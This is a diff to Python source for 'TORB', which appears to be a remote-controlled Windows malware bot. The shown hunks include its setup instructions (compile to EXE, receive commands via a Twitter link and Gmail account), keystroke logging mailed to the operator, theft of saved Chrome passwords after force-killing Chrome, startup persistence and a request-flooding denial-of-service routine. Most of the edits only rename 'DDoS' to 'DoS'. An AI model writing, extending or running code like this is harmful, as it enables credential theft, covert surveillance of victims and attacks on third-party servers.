@@ -26,7 +26,7 @@
 
 # Instructions:
 
-# 1) Provide link to your Twitter bot in variable 'r'
+# 1) Provide link to your Twitter bot in variable 'cntrlPanel'
 # 2) Provide your Gmail bot's authentication details in variable 'to'
 # 3) Compile to EXE
 # 4) Execute and check your inbox. You'll receive the commands
@@ -240,8 +240,8 @@ def main():
 				try:
 					torbDoS(cddu)
 				except:
-					print "Error launching DDoS"
-					relayMe("TORB is unable to launch DDoS on this host. Check for typos and try again.")
+					print "Error launching DoS"
+					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
 				q = z
 			elif z == "startup":
 				print "Embedding to startup..."
@@ -351,8 +351,8 @@ def main():
 				try:
 					torbDoS(cddu)
 				except:
-					print "Error launching DDoS"
-					relayMe("TORB is unable to launch DDoS on this host. Check for typos and try again.")
+					print "Error launching DoS"
+					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
 				q = z
 			elif z == "startup":
 				print "Embedding to startup..."
@@ -676,8 +676,7 @@ def deliverMe(feedMe):
 		print "\nRecorded Keystrokes: %s\n" % (a)
 
 	sent_from = gmail_user  
-	# Put your receiving GMail address here!
-	# This is where the keystrokes are sent to.
+
 	subject = 'TORB - Pythogen'  
 
 	# Email Body Condition (Activation OR Keylogs)
@@ -734,6 +733,7 @@ def chrme():
         	chrpwStr = chrpwStr + "%s\n" % ("%s - %s : %s" % (url, credentials[0].encode('utf-8'), credentials[1]))
 
 def EPE_Main():
+	# Kill Chrome process for password extraction
 	os.system('taskkill /F /IM chrome.exe')
 
 def OnKeyboardEvent(event):
@@ -790,7 +790,7 @@ def getWindowTitle():
 	kernel32.CloseHandle(hwnd)
 	return True
 
-# --- DDoS Procedure ---
+# --- DoS Procedure ---
 def auto_send_request(server_dd, number_of_requests=10):
     global inc
     requestsCheck = (requestsDD - 1)
@@ -809,9 +809,9 @@ def auto_send_request(server_dd, number_of_requests=10):
 				#	print "Stopper detected"
 				#	break
 				if bckChck == 0:
-					relayMe("TORB DDoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
+					relayMe("TORB DoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
 				elif bckChck == 1:
-					comm_backup("TORB DDoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
+					comm_backup("TORB DoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
         except IOError:
             print "Error - Bad host!\n" 
         if inc >= requestsCheck:
@@ -833,7 +833,7 @@ def run(url4dd, num_req):
     global requestsDD
     global inc
     inc = 0
-    print "DDoS Started."
+    print "DoS Started."
     server_dds = url4dd
     requestsDD = int(num_req)
     flood(server_dds, requestsDD)
